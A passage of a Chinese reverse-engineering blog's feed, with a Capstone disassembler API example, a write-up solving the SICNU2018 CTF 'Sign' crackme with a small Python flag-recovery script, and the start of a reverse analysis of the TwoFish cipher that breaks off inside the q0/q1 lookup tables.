&amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!cs_regs_access(handle, insn,       <span class="comment">//每条指令所有读取和修改的寄存器</span></span><br><span class="line">regs_read, &amp;regs_read_count,</span><br><span class="line">regs_write, &amp;regs_write_count)) &#123;</span><br><span class="line"><span class="keyword">if</span> (regs_read_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters read:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_read_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_read[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (regs_write_count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\tRegisters modified:"</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; regs_write_count; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s"</span>, cs_reg_name(handle, regs_write[i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c48d04fea172636.jpg" alt></p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(四)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-四&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-四&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(四)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>SICNU-CTF逆向 Sign</title>
    <link href="https://kabeor.github.io/SICNU-CTF%E9%80%86%E5%90%91%20Sign/"/>
    <id>https://kabeor.github.io/SICNU-CTF逆向 Sign/</id>
    <published>2019-07-26T04:27:46.431Z</published>
    <updated>2019-07-26T04:35:11.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICNU2018-CTF逆向-Sign"><a href="#SICNU2018-CTF逆向-Sign" class="headerlink" title="SICNU2018-CTF逆向 Sign"></a>SICNU2018-CTF逆向 Sign</h1><p>2018年五月川师的比赛题，一直放着没有看，今天清理文件拿出来看一下</p><p>x86,入口jmp一看就是VS编译，无壳无花</p><p>之前一直好奇大佬们是怎样做到秒题的，做完这道才题知道，只有敏锐的洞察力快速定位核心代码才是王道</p><p>main函数<br><img src="https://i.loli.net/2019/07/26/5d3a7c867363016763.jpg" alt></p><p>很显然有两个判断点<br>第一个直接看赋值v5的函数sub_401186，这道题有意思的点在于每个函数都会有一个二次跳转，因此如果不能及时定位到关键点，在限定的时间内很难分析出来<br><img src="https://i.loli.net/2019/07/26/5d3a7d54bc1be16220.jpg" alt><br>非常无用的跳转，一直想拿IDC脚本剔除，但可惜没什么思路<br>进入之后<br><img src="https://i.loli.net/2019/07/26/5d3a7d9d8e6f428329.jpg" alt></p><p>v8限定字符串长度，开头必须是 ‘SICNU{’  ,算上最后一个一定是‘}’，因此我们还要输入16个字符。<br>动态调试发现下面的判断也只判断了输入前6个字符，然后截断，并没有做其他操作</p><p>回到主函数看到第二个判定在v3，直接进入<br><img src="https://i.loli.net/2019/07/26/5d3a7ecb6d76846189.jpg" alt><br><img src="https://i.loli.net/2019/07/26/5d3a7ee02379c25978.jpg" alt></p><p>如图，动态调试发现，v1是对{后的输入每次取一字符，然后和key1密钥表异或，共操作六次<br>v2是剩余字符长度，其中除去反括号还有10个字符，这里sub_401230的功能F5识别出错，直接看汇编<br><img src="https://i.loli.net/2019/07/26/5d3a7ffddfe4436075.jpg" alt><br>rep stosd循环，ecx,11h为循环次数，eax初始0CCCCCCCCh，最后v2为固定值11</p><p>接下来判断是否是数字，是则+17，不是则与key2密钥表异或</p><p>接下来验证答案，要求C1等于key3-v20，C2等于key4-v13，所以写脚本直接反求即可</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a0 = [<span class="number">0xE5</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x95</span>, <span class="number">0xEC</span>]</span><br><span class="line">a1 = [ <span class="number">0xFC</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x3B</span>]</span><br><span class="line">key1 = [<span class="number">0xB2</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0xA1</span>, <span class="number">0xE4</span>, <span class="number">0xF8</span>, <span class="number">0xA9</span>]</span><br><span class="line">key2 = [<span class="number">0xA3</span>, <span class="number">0x45</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x3E</span>, <span class="number">0x26</span>, <span class="number">0x5D</span>, <span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">C1 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">C1[i]=chr(key1[i]^a0[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"flag:    SICNU&#123;"</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">print(C1[a], end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">C2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">C2[i] = a1[j] - <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span>(C2[i]&gt;=<span class="number">48</span> <span class="keyword">and</span> C2[i]&lt;=<span class="number">57</span>):</span><br><span class="line">C2[i] = chr(C2[i])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">C2[i] = chr(key2[k] ^ a1[j])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">k=k+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">print(C2[a], end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>flag<br><img src="https://i.loli.net/2019/07/26/5d3a8138d970b13890.jpg" alt></p><p>From <a href="https://kabeor.github.io/SICNU-CTF逆向 Sign/">https://kabeor.github.io/SICNU-CTF逆向 Sign/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SICNU2018-CTF逆向-Sign&quot;&gt;&lt;a href=&quot;#SICNU2018-CTF逆向-Sign&quot; class=&quot;headerlink&quot; title=&quot;SICNU2018-CTF逆向 Sign&quot;&gt;&lt;/a&gt;SICNU2018-CTF逆向 Sign&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>逆向分析加解密之TwoFish算法</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B9%8BTwoFish%E7%AE%97%E6%B3%95/"/>
    <id>https://kabeor.github.io/逆向分析加解密之TwoFish算法/</id>
    <published>2019-07-25T04:02:55.808Z</published>
    <updated>2019-08-02T07:09:58.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向分析加解密之TwoFish算法"><a href="#逆向分析加解密之TwoFish算法" class="headerlink" title="逆向分析加解密之TwoFish算法"></a>逆向分析加解密之TwoFish算法</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">https://xz.aliyun.com/t/5807</a></p></blockquote><p>前几天某师傅给我发来一个逆向题，拿来分析发现竟是AES决赛算法之一的TwoFish算法，之前网上对此算法的逆向分析竟然一个都没有，对算法的介绍也只有寥寥数语，于是想准备在这里与大家分享对该算法的逆向分析以及CTF中此算法的变体。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>官方有一个68页的pdf，有兴趣可以看一下<br><a href="http://www.schneier.com/twofish-analysis-shiho.pdf" target="_blank" rel="noopener">http://www.schneier.com/twofish-analysis-shiho.pdf</a></p><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://i.loli.net/2019/07/25/5d391b311e84491804.jpg" alt></p><p>TwoFish的意思应该就是这样交叉运算的形状吧</p><h3 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h3><p>TwoFish加密需要明文(plain)和密钥(key)<br>总的来说进行一次加解密可分为三个环节</p><ol><li>Input whitening</li><li>16次循环</li><li>Output whitening</li></ol><h4 id="Input-whitening"><a href="#Input-whitening" class="headerlink" title="Input whitening"></a>Input whitening</h4><blockquote><ol><li>拓展密钥</li></ol></blockquote><p>在Twofish 算法中，规定密钥的长度 N = 128, N = 192, N = 256三种。也就是说密钥的长度可以在128-bit ~ 256-bit之间变化。</p><p>我们需要产生40个与密钥相关的K(i)，这里的K(i)是根据密钥算出来的32-bit数据<br>除此以外，我们还需要4个与密钥相关的S-box，也就是s(i)()。</p><p>为计算K和S，定义MDS矩阵</p><p><img src="https://i.loli.net/2019/07/25/5d392304b308519968.jpg" alt> </p><p>且对于MDS 矩阵，有限域GF的定义如下：<br><code>GF(2^8) ≡ GF(2)(x)/v(x)，其中v(x) = x^8 + x^6 + x^5 + x^3 + 1</code>   </p><p>此外还需要h函数</p><pre><code> y(k,j) = x(j)                     j = 0, ... ,3如果：k == 4    y(3,0) = q1[y(4,0)] xor l(3,0)    y(3,1) = q0[y(4,1)] xor l(3,1)    y(3,2) = q0[y(4,2)] xor l(3,2)    y(3,3) = q1[y(4,3)] xor l(3,3)如果：k &gt;= 3    y(2,0) = q1[y(3,0)] xor l(2,0)    y(2,1) = q1[y(3,1)] xor l(2,1)    y(2,2) = q0[y(3,2)] xor l(2,2)    y(2,3) = q0[y(3,3)] xor l(3,3)对于所有情况：    y0 = q1[q0[q0[y(2,0)] xor l(1,0)] xor l(0,0)]    y1 = q0[q0[q1[y(2,1)] xor l(1,1)] xor l(0,1)]    y2 = q1[q1[q0[y(2,2)] xor l(1,2)] xor l(0,2)]    y3 = q0[q1[q1[y(2,3)] xor l(1,3)] xor l(0,3)]</code></pre><p>实现代码稍后来说</p><blockquote><ol><li>输入白化</li></ol></blockquote><p>因为加密前的plain text是128 bits，也就是16 bytes。假设这16 bytes分别是p0, … ,p15。将p0, … ,p15分为4组：<br><code>P(i) = ∑p(4i+j)2^(8j)，其中i,j = 0, ... ,3</code></p><p>然后进行运算<code>R(0,i) = P(i) xor K(i)，其中i = 0, ... ,3</code></p><h4 id="16次运算"><a href="#16次运算" class="headerlink" title="16次运算"></a>16次运算</h4><p>将以下公式循环16次</p><pre><code>(F(r,0), F(r,1)) = F(R(r,0), R(r,1), r) R(r+1,0) = ROR(R(r,2) xor F(r,0), 1) R(r+1,1) = ROL(R(r,3), 1) xor F(r,1) R(r+1,2) = R(r,0) R(r+1,3) = R(r,1)</code></pre><p>其中，F函数为以下操作</p><pre><code>t0 = g(r0)t1 = rol(r1, 8)t1 = g(t1)o = 2*rF0 = (T0 +  T1 + K(2r+8)) mod 2^32F1 = (T0 + 2T1 + K(2r+9)) mod 2^32</code></pre><p>其中g函数为核心函数</p><pre><code>x(i) = [X/2^(8i)] mod 2^8  其中i = 0, ... ,3y(i) = s(i)(x(i))       其中i = 0, ... ,3</code></pre><p><img src="https://i.loli.net/2019/07/25/5d392756d7d6492028.jpg" alt> </p><pre><code>Z = ∑z(i)2^(8i)，其中i = 0, ... ,3</code></pre><h4 id="输出白化"><a href="#输出白化" class="headerlink" title="输出白化"></a>输出白化</h4><pre><code>C(i) = R(16,(i+2) mod 4) xor K(i+4)，其中i = 0, ... ,3</code></pre><p>最后计算组成密文</p><pre><code>c(i) = [C(i/4) / 2^(8(i mod 4))] mod 2^8，其中i = 0, ... ,15</code></pre><p>下面来逆向分析看一下实际实现吧</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>拿到题后PEID分析<br><img src="https://i.loli.net/2019/07/25/5d392ac4cd3a266075.jpg" alt><br>分析到了TwoFish算法</p><p>IDA分析一下，进入主函数看到流程<br><img src="https://i.loli.net/2019/07/25/5d392b24602bc32573.jpg" alt><br><img src="https://i.loli.net/2019/07/25/5d392b4b3d71797118.jpg" alt></p><p>发现有五个选项，选项名字在sub_402FDA中</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_402FDA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to jiami jiemi game go.go.go."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1._jiemi_(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2._jiami_"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3._jiemi__flag(admin only)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4.exit"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"5._yanzheng__"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有选项2和5可用，即加密和验证flag</p><p>进入验证函数sub_40302B查看<br><img src="https://i.loli.net/2019/07/25/5d392c3cbd53454896.jpg" alt></p><p>这里我已经注释出密文和key，因此我们只需要解密即可，但只用标准解密算法就可以吗？我们来验证一下</p><p>很明显加密函数为sub_402E5D(&amp;key, plain, &amp;v3);  参数v3传出密钥<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_BYTE *__<span class="function">cdecl <span class="title">sub_402E5D</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_401570(a1, <span class="number">128u</span>);                    <span class="comment">// a1 = key   密钥生成k和s</span></span><br><span class="line">  sub_401626(v3, a2, a3);                          <span class="comment">//输入白化，循环，输出白化</span></span><br><span class="line">  <span class="keyword">return</span> sub_401626(v3, (a2 + <span class="number">16</span>), a3 + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面来结合标准实现分析<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401570</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// ST1C_4</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span class="line"></span><br><span class="line">  v2 = sub_402D53(a1, a2 &gt;&gt; <span class="number">3</span>);                 <span class="comment">// key_t* tf_key = expand_key(s, len/8);  拓展密钥</span></span><br><span class="line">  v3 = sub_4025C6(v2);                          <span class="comment">// subkey_t *tf_subkey = Twofish_generate_subkey(tf_key);  生成密钥</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">4260u</span>);</span><br><span class="line">  v5 = sub_401B7A(v4, v3, <span class="number">0x1010101</span>, *v2 &gt;&gt; <span class="number">3</span>); <span class="comment">// tf_twofish = Twofish_generate_ext_k_keys(tf_twofish,tf_subkey,0x01010101,(tf_key-&gt;len/8));  生成k</span></span><br><span class="line">  v6 = sub_401CF8(v5, v3, *v2 &gt;&gt; <span class="number">3</span>);            <span class="comment">// tf_twofish = Twofish_generate_ext_s_keys(tf_twofish,tf_subkey,(tf_key-&gt;len/8));  生成s</span></span><br><span class="line">  <span class="built_in">free</span>(v2[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(v2);</span><br><span class="line">  <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>拓展密钥</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3930a1cc7b017798.jpg" alt><br>可以看到题中对位数分析的判定进行了修改</p><blockquote><p>生成密钥</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d39312bb0d7d18656.jpg" alt><br>c实现<img src="https://i.loli.net/2019/07/25/5d3931a257bc836488.jpg" alt></p><p>rsm函数定义为</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br></pre></td></tr></table></figure><blockquote><p>k生成</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3931f15177364722.jpg" alt><br>h函数内部，可以看出，IDA将二维数组直接一维化<br><img src="https://i.loli.net/2019/07/25/5d39322bb987d21871.jpg" alt></p><p>q0,q1都是256大小的数组<br><img src="https://i.loli.net/2019/07/25/5d3932450ddac91007.jpg" alt><br>标准<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;<span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span 